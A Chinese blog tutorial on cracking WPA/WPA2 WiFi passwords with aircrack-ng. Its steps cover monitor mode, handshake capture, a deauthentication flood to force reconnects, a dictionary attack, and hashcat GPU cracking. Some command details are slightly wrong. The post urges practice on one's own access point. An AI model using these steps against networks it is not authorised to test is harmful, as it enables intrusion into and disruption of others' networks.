---
title: "技巧：aircrack-ng暴力破解wifi密码"
date: 2022-08-20T19:48:36+08:00
categories:
- other
- technique
tags:
- aircrack-ng
- airodump-ng
keywords:
- aircrack-ng
- airodump-ng
---

[aircrack-ng](https://www.aircrack-ng.org/) 是一个与802.11标准[无线网络标准]的无线网络分析有关的安全软件，aircrack-ng 可以工作在任何支持监听模式的无线网卡上，嗅探802.11a，802.11b，802.11g的数据。

**主要功能：**

* 网络侦测
* 数据包嗅探
* WEP和WPA/WPA2-PSK破解

<!--more-->

aircrack-ng套件包含以下组件：

* **aircrack-ng**           - 破解wep以及wpa[字典攻击]秘钥
* **airdecap-ng**           - 通过已知秘钥来解密web或wpa嗅探数据
* **airmon-ng**             - 将网卡设置为监听模式
* **aireplay-ng**           - 数据包嗅探：将无线网络数据输送到PCAP货IVS文件并显示网络信息
* **airtun-ng**             - 创建虚拟管道
* **airolib-ng**            - 保存、管理ESSID密码列表

## 准备

* 建立一个 wifi 接入点 （用自己的练习）
* 支持监听模式的无线网卡，可参见
* 安装 Linux 的计算机

> 下面的操作中，命令中所有需要跟据实际环境替换的内容都以 `${}` 包围

## 安装

```text
$ sudo apt install aircrack-ng
```

## 列出支持监听模式网卡

```text
$ sudo airmon-ng
```
输出一般如下（不同设备输出不同）：

```text
PHY     Interface       Driver          Chipset

phy0    wlan0           rt800usb        Ralink Technology, Corp. RT3572
```
如果列表为空，则代表没有支持监听模式的设备

## 启用设备监听

```text
$ sudo airmon-ng start ${Interface}
```

如果启用失败，可能是因为之前已经有设备进入监听模式了，可以使用下面的命令

```text
$ airmon-ng check kill
```

如果监听成功，则使用 `sudo iwconfig` 可以看到原本的设备名称后面多了 mon 

## 扫描 wifi 接入点

```text
$ sudo airodump-ng ${Interface}
```

命令不会自动退出，扫描一会就可以按 ctrl+c 退出，大致输出如下：

```text
 CH  2 ][ Elapsed: 30 s ][ 2022-08-20 20:30 

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 XX:XX:XX:XX:XX:XX  -45       94        0    0  11  130   WPA2 CCMP   PSK  XXXXXXXXXXXXXXXX
 ......

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 XX:XX:XX:XX:XX:XX  YY:YY:YY:YY:YY:YY  -75    0 - 1      2        3  

```

字段解释

**第一部分**

* CH 表示扫描信道
* Elapsed 表示已经运行的时间

* **第二部分**

* BSSID : 接入点的MAC地址
* PWR : 网卡反馈的信号水平，越大代表信号越好。`-1`表示驱动不支持信号水平
* RXQ : 接收质量，指过去100秒内成功接收到的数据包的百分比
* Beacons : 接入点发出的公告报文的数量，每个接入点每秒大概发送10个公告包
* #Data : 捕捉到的数据包的数量
* #/s : 过去10秒，每秒接收到的数据包数量的平均值
* CH : 无线信道（从beacon包中得到），注意：即使固定了信道，有时也会捕捉到其他信道的数据包，这时由于无线电干扰造成的
* MB : 如果MB=11，就是802.1b，如果MB=22，就是802.1b+，更高的就是802.1g。如上图54后的小数点表示支持短前导码，11后面的e表示该网络支持QoS
* ENC : 表示使用的加密算法。OPN表示没有加密，“WEP？”表示不确定是WEP还是WPA/WPA2；WEP表示静态或者动态的WEP,TKIP或者CCMP表示WPA/WPA2
* CIPHER : 检测出的密码体系，CCMP,WRAP,TKIP,WEP,WEP40和WEP104中的一种。虽然不是必须的，但是TKIP通常用于WPA，CCMP常用于WPA2。当键字索引大于0时，会显示WEP40。（40位时，索引可以是0-3；104位时，索引需为0）
* AUTH : 使用的认证协议。GMT（WPA/WPA2 使用单独的认证服务器），SKA（WEP共享密钥） ，PSK（WPA/WPA2 预共享密钥），或者OPN（WEP开放认证）
* ESSID : 无线网络名称。也叫“SSID”，如果开启SSID隐藏模式，则此项为空。在这种情况下，airodump-ng会尝试通过探测响应和关联请求恢复SSID

**第三部分**

* STATION : 每一个已连接或者正尝试连接用户的MAC地址，还没有连接上接入点的用户的BSSID是“not associated”
* Lost : 过去的10秒钟丢失的数据包数量
* Packets : 用户发出的数据包数量
* Probes : 用户探测的无线网络名称，如果还没有连接那么它是用户正尝试连接的网络名称

## 监听

选择一个要破解的接入点，使用接入点信息替换下面命令的参数

```text
$ sudo airodump-ng -c ${CH} --bssid ${BSSID} -w capture ${Interface}
```

参数解释
* `-c` : 指定信道号
* `--bssid` : 指定无线接入点设备的BSSID
* `-w` : 输出到文件

如果想减小获取的包的体积，可以只捕获 IVs 信息

```text
$ sudo airodump-ng -c ${CH} --bssid ${BSSID} -w capture -ivs ${Interface}
```

参数解释
* `--ivs` : 只捕获IVs

> 注意 : 如果想要使用 GPU 加速破解，就**不能**使用 `-ivs`

此时，可以等待，直到命令的第一部分出现 `WPA handshake: XX:XX:XX:XX:XX:XX`，则代表握手包已经抓取成功了。如果一直没有成功，可以使用下面的步骤，强制断开连接以加速获取


## 强制断开以加速获取数据包（可选）

```text
$ sudo aireplay-ng -0 0 -a ${BSSID}
```

参数解释
* `-0` : 模式中的一种：冲突攻击模式，后面跟发送次数
* `-a` : 指定无线接入点设备的BSSID

## 使用字典来破解 

```text
$ aircrack-ng capture-01.ivs -w password.txt
$ aircrack-ng capture-01.cap -w password.txt
```

参数解释

* `-w` : 字典文件

破解成功输出如下

```text
                               Aircrack-ng 1.6 

      [00:00:00] 3/5 keys tested (148.08 k/s) 

      Time left: 0 seconds                                      80.00%

                           KEY FOUND! [ xxxxxxxxxxxxxxxxx ]


      MastAr KAy     : AA AA AA AD AA AA AA DA AD BA BA DA AA AA AA AA 
                       AA AF AA BA AA AB AA AA AF AA FF AA AA AA AA AA 

      TransiAnt KAy  : AF AD AA AA FA AA AA AA DA AA AA AF AA AA AA AA 
                       AA DA AA AA AA AA AF AA AA AA AA AA AA AA AD AA 
                       AA AA AA AA AA AA AA AA AA AA AA AA AD FA AA AF 
                       AA DA AA AA BD AA AA AA AA AA AF FA AA AA AA AA 

      AAPOL HMAA     : AA DA AA AD DA AA AA AA AA AA BA AA AA AA AA AA 
```

## 使用GPU加速破解

> 此节没有实验过（因为穷，买不起显卡），方法记录在这里，用于以后实践

### 安装 hashcat 和 hashcat-nvidia

安装 nvidia 驱动和 nvidia-cuda-toolkit 这个要跟据显卡型号来

```text
$ sudo apt install hashcat hashcat-nvidia 
```

### 将cap->hccapx

```
$ aircrack-ng capture-01.cap -j capture-01
```

### 使用 hashcat 破解

```text
$ hashcat -w 3 -m 2500 capture-01.hccapx worldlist.txt
```

参数解释

* `-w` 工作负载配置文件     | 1 : 低 | 2 : 默认 | 3 : 高 | 4 : 噩梦 |
* `-m` Hash类型，详见： `hashcat --help`
